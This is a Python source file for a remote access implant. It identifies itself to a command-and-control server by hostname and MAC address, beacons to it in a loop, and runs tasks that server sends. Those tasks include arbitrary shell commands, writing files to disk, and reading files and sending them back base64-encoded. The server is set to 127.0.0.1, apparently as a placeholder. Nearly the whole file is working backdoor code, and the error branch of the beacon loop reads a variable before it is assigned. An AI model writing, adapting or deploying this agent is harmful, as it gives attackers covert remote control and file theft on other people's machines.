import os
import uuid
import json
import time
import base64
import socket
import threading
import subprocess

import http.client
import urllib.parse

SERVER = "127.0.0.1"
PORT = 8000
MAX_BACKOFF = 15

class Agent:
    def __init__(self):
        self._conn = None
        self.client_id = None
        self.mac = self.get_mac()
        self.hostname = socket.gethostname()
        
        self.handlers = {
            "shell": self.handle_shell,
            "health": self.handle_health,
            "upload": self.handle_upload,
            "download": self.handle_download,
            "disconnect": self.handle_disconnect
        }
    
    def _get_conn(self):
        if not self._conn:
            self._conn = http.client.HTTPConnection(SERVER, PORT, timeout=70)
        return self._conn

    def rpc(self, method, **params):
        payload = json.dumps ({
            "jsonrpc": "2.0",
            "method": method,
            "params": params,
            "id": str(uuid.uuid4())
        }).encode()

        try:
            conn = self._get_conn()
            conn.request(
                "POST", "/rpc",
                body = payload,
                headers = {
                    "Content-Type": "application/json",
                    "Content-Length": str(len(payload)),                   
                }
            )
            res = conn.getresponse()

            if res.status == 204:
                res.read()
                return None
            
            data = json.loads(res.read())

            if "error" in data:
                err = data["error"]
                raise Exception(err["message"] if isinstance(err, dict) else err)
                
            return data.get("result")

        except Exception:
            self._conn = None
            raise

    @staticmethod
    def get_mac():
        mac = uuid.getnode()
        return ':'.join(
            f"{(mac >> shift) & 0xff:02x}"
            for shift in range(40, -1, -8)
        )

    @staticmethod
    def result(stdout="", stderr="", exit_code=0):
        return {
            "stdout": stdout,
            "stderr": stderr,
            "exit_code": exit_code
        }

    def handle_shell(self, params):
        cmd = params.get("cmd")

        if not cmd:
            return self.result(stderr = "no command provided", exit_code = -1)
        
        result = subprocess.run(
            cmd,
            shell = True,
            capture_output = True,
            text = True,
            timeout = 300
        )

        return self.result(
            stdout = result.stdout,
            stderr = result.stderr,
            exit_code = result.returncode
        )
    
    def handle_upload(self, params):
        path = params.get("path")
        data = params.get("data")

        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)

        with open(path, "wb") as f:
            f.write(base64.b64decode(data))
            
        return self.result(stdout=f"written: {path}")
    
    def handle_download(self, params):
        path = params.get("path")
        with open(path, "rb") as f:
            return self.result(stdout=base64.b64encode(f.read()).decode())

    def handle_health(self, params):
        return self.result(
            stdout = json.dumps({
                "status": "ok",
                "hostname": self.hostname,
                "client_id": self.client_id
            }),
            exit_code = 0
        )
    
    def handle_disconnect(self, params):
        self._running = False
        return self.result(stdout="disconnecting")

    def identify(self):
        result = self.rpc(
            "identify", 
            hostname = self.hostname,
            mac = self.mac
        )

        if result:
            self.client_id = result.get("client_id")

        return self.client_id

    def beacon(self):
        return self.rpc(
            "beacon", 
            client_id = self.client_id
        )
    
    def send_result(self, task_id, status, output):
        self.rpc(
            "task_result", 
            client_id = self.client_id,
            task_id = task_id,
            result = {
                "status": status,
                "output": output
            }
        )

    def execute_task(self, task):
        try:
            task_id = task.get("id")
            method = task.get("method")
            params = task.get("params", {})

            handler = self.handlers.get(method)
            if not handler:
                self.send_result(
                    task_id, 
                    "error",
                    self.result(stderr="method not found", exit_code=1)
                )
                return
            
            try:
                output = handler(params)
                status = "ok"
            except Exception as e:
                output = self.result(stderr = str(e), exit_code = -1)
                status = "error"

            self.send_result(task_id, status, output)
        
        except Exception:
            pass

    def run(self):
        while True:
            try:
                if self.identify():
                    break
            except Exception:
                pass

            time.sleep(5)
               
        self._running = True
        print(f"[+] identified as {self.client_id}") # DEBUG

        while self._running:
            try:
                result = self.beacon()
                if result and result.get("task"):
                    threading.Thread(
                        target=self.execute_task,
                        args=(result["task"],),
                        daemon=True
                    ).start()
                
                backoff = 1
                time.sleep(5)

            except Exception:
                time.sleep(backoff)
                backoff = min(backoff + 1, MAX_BACKOFF)

if __name__ == "__main__":
    Agent().run()